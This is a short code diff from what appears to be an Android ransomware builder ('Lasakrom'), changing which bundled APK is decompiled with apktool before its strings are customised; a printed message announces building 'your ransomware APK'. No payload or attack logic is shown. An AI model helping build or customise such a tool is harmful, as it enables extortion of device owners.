@@ -176,7 +176,7 @@ class Lasakrom:
                 else: continue
             print(f"{b}>{w} Membangun APK ransomware Anda")
             print(w+"-"*43+d)
-            os.system("apktool d data/v2/Lasakrom.apk")
+            os.system("apktool d data/v2/xransom.apk")
             if os.path.isdir("Lasakrom"):
                 strings="Lasakrom/res/values/strings.xml"
                 print("I: Using strings: "+strings)
